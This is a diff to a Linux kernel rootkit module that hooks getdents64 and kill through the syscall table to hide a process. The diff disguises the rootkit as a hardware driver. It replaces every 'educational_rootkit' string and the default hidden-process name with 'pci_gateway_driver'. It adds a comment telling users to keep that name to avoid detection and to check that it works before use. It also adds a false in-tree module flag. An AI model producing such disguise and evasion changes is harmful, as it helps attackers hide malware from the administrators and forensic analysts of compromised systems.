@@ -10,6 +10,10 @@
 #include <linux/slab.h>
 #include <asm/paravirt.h>
 
+// This is an example rootkit to be used in class.
+// In use, ensure it is called pci_gateway_driver to avoid being obvious and easily detected.
+// Validate that it works before use.
+
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
 #define KPROBE_LOOKUP 1
 #include <linux/kprobes.h>
@@ -24,13 +28,13 @@ asmlinkage long (*original_getdents64)(const struct pt_regs *);
 asmlinkage long (*original_kill)(const struct pt_regs *);
 
 // Module parameters for educational purposes
-static char *hide_process = "educational_rootkit";
+static char *hide_process = "pci_gateway_driver";
 module_param(hide_process, charp, 0644);
-MODULE_PARM_DESC(hide_process, "Process name to hide (educational example)");
+MODULE_PARM_DESC(hide_process, "Process name to hide (pci_gateway_driver)");
 
 static char *magic_string = "forensics_key";
 module_param(magic_string, charp, 0644);
-MODULE_PARM_DESC(magic_string, "Magic string for detection (educational example)");
+MODULE_PARM_DESC(magic_string, "Magic string for detection (pci_gateway_driver)");
 
 // Buffer to store our fake log entries
 static char *log_buffer;
@@ -51,7 +55,7 @@ static unsigned long *get_syscall_table(void) {
     
     ret = register_kprobe(&kp);
     if (ret < 0) {
-        printk(KERN_INFO "educational_rootkit: register_kprobe failed, returned %d\n", ret);
+        printk(KERN_INFO "pci_gateway_driver: register_kprobe failed, returned %d\n", ret);
         return NULL;
     }
     
@@ -151,12 +155,12 @@ static struct proc_dir_entry *proc_entry;
 
 // Module initialization
 static int __init educational_rootkit_init(void) {
-    printk(KERN_INFO "educational_rootkit: Loading module\n");
+    printk(KERN_INFO "pci_gateway_driver: Loading module\n");
     
     // Allocate log buffer
     log_buffer = kmalloc(4096, GFP_KERNEL);
     if (!log_buffer) {
-        printk(KERN_ERR "educational_rootkit: Failed to allocate log buffer\n");
+        printk(KERN_ERR "pci_gateway_driver: Failed to allocate log buffer\n");
         return -ENOMEM;
     }
     memset(log_buffer, 0, 4096);
@@ -165,7 +169,7 @@ static int __init educational_rootkit_init(void) {
     // Create proc entry for forensic analysis
     proc_entry = proc_create("rootkit_forensics", 0444, NULL, &proc_log_fops);
     if (!proc_entry) {
-        printk(KERN_ERR "educational_rootkit: Failed to create proc entry\n");
+        printk(KERN_ERR "pci_gateway_driver: Failed to create proc entry\n");
         kfree(log_buffer);
         return -ENOMEM;
     }
@@ -173,13 +177,13 @@ static int __init educational_rootkit_init(void) {
     // Get syscall table
     __sys_call_table = get_syscall_table();
     if (!__sys_call_table) {
-        printk(KERN_ERR "educational_rootkit: Failed to get syscall table\n");
+        printk(KERN_ERR "pci_gateway_driver: Failed to get syscall table\n");
         remove_proc_entry("rootkit_forensics", NULL);
         kfree(log_buffer);
         return -EFAULT;
     }
     
-    printk(KERN_INFO "educational_rootkit: syscall table found at %p\n", __sys_call_table);
+    printk(KERN_INFO "pci_gateway_driver: syscall table found at %p\n", __sys_call_table);
     
     // Store original syscall functions
     original_getdents64 = (void *)__sys_call_table[__NR_getdents64];
@@ -191,9 +195,9 @@ static int __init educational_rootkit_init(void) {
     __sys_call_table[__NR_kill] = (unsigned long)hooked_kill;
     protect_memory();
     
-    printk(KERN_INFO "educational_rootkit: Syscalls hooked\n");
-    printk(KERN_INFO "educational_rootkit: Module loaded successfully\n");
-    printk(KERN_INFO "educational_rootkit: Check /proc/rootkit_forensics for forensic data\n");
+    printk(KERN_INFO "pci_gateway_driver: Syscalls hooked\n");
+    printk(KERN_INFO "pci_gateway_driver: Module loaded successfully\n");
+    printk(KERN_INFO "pci_gateway_driver: Check /proc/rootkit_forensics for forensic data\n");
     
     return 0;
 }
@@ -218,7 +222,7 @@ static void __exit educational_rootkit_exit(void) {
         kfree(log_buffer);
     }
     
-    printk(KERN_INFO "educational_rootkit: Module unloaded\n");
+    printk(KERN_INFO "pci_gateway_driver: Module unloaded\n");
 }
 
 module_init(educational_rootkit_init);
@@ -228,3 +232,4 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Educational Example for Forensics Training");
 MODULE_DESCRIPTION("A safe, limited example of rootkit techniques for forensic analysis education");
 MODULE_VERSION("1.0");
+MODULE_INFO(intree, "Y");
